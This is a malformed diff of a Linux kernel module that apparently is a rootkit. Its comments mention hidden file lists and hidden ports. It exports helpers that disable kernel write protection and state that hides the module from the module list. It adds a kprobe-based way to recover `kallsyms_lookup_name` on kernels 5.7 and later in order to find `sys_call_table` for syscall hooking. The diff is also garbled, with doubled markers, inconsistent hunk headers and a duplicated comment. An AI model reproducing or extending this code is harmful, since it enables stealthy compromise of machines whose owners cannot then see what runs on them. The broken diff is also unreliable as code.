@@ -155,16 +155,65 @@
 -static short module_hidden = 0;
 +struct list_head *module_previous;
 +short module_hidden = 0;
- static struct proc_dir_entry *proc_entry;
- 
- // 隐藏的文件列表
+static struct proc_dir_entry *proc_entry;
+
+// 隐藏的文件列表
 @@ -71,6 +71,8 @@
- EXPORT_SYMBOL(disable_write_protection);
- EXPORT_SYMBOL(enable_write_protection);
+EXPORT_SYMBOL(disable_write_protection);
+EXPORT_SYMBOL(enable_write_protection);
 +EXPORT_SYMBOL(module_previous);
 +EXPORT_SYMBOL(module_hidden);
- 
- // 查找系统调用表
+
+// 内核5.7+兼容的kallsyms_lookup_name获取方法
++#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
++static unsigned long kln_addr = 0;
++static unsigned long (*kallsyms_lookup_name_ptr)(const char *name) = NULL;
++
++typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
++
++static struct kprobe kp = {
++    .symbol_name = "kallsyms_lookup_name"
++};
++
++static int init_kallsyms_lookup_name(void) {
++#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
++    int ret;
++    ret = register_kprobe(&kp);
++    if (ret < 0) {
++        printk(KERN_ERR "[%s] register_kprobe failed, returned %d\n", MODULE_NAME, ret);
++        return ret;
++    }
++    kln_addr = (unsigned long) kp.addr;
++    unregister_kprobe(&kp);
++    kallsyms_lookup_name_ptr = (kallsyms_lookup_name_t) kln_addr;
++    printk(KERN_INFO "[%s] kallsyms_lookup_name address: 0x%lx\n", MODULE_NAME, kln_addr);
++#endif
++    return 0;
++}
++#endif
++
+// 查找系统调用表
++static unsigned long *find_sys_call_table(void) {
++    unsigned long *syscall_table;
++    
++#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
++    if (kallsyms_lookup_name_ptr) {
++        syscall_table = (unsigned long*)kallsyms_lookup_name_ptr("sys_call_table");
++    } else {
++        printk(KERN_ERR "[%s] kallsyms_lookup_name not available\n", MODULE_NAME);
++        return NULL;
++    }
++#elif LINUX_VERSION_CODE > KERNEL_VERSION(4,4,0)
++    syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
++#else
++    // 对于更老的内核版本的处理
++    syscall_table = NULL;
++#endif
++    
++    return syscall_table;
++}
+
+// 查找系统调用表
  
  // 检查端口是否应该被隐藏
 @@ -84,1 +84,1 @@
